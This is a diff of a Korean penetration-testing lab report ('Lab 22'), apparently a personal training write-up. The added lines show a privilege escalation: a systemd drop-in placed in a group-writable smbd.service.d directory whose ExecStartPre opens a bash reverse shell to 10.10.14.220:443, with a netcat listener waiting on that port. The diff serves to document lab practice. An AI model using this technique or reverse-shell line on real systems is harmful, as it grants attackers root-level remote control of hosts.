@@ -2,7 +2,7 @@
 publish: true
 title: 모의해킹 보고서 – Lab 22
 created: 2026-11-20T00:02:44.797Z
-modified: 2026-11-20T05:48:03.638Z
+modified: 2026-11-20T06:05:28.750Z
 tags:
   - pentest
   - linux
@@ -595,10 +595,20 @@ marcus@abducted:~$ ls -ld /etc/systemd/system/smbd.service.d/
 drwxrws--- 2 root operators 4096 Jun  4 13:41 /etc/systemd/system/smbd.service.d/
 ```
 
-```
-```
+![[Template/Image/Pasted image 20261120150436.png]]
 
 ```
+marcus@abducted:/etc/systemd/system/smbd.service.d$ vi LPE.conf
+marcus@abducted:/etc/systemd/system/smbd.service.d$ cat LPE.conf
+[Service]
+ExecStartPre=/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.220/443 0>&1'
+```
+
+![[Template/Image/Pasted image 20261120150526.png]]
+
+```
+└─$ nc -lvnp 443
+listening on [any] 443 ...
 ```
 
 ```
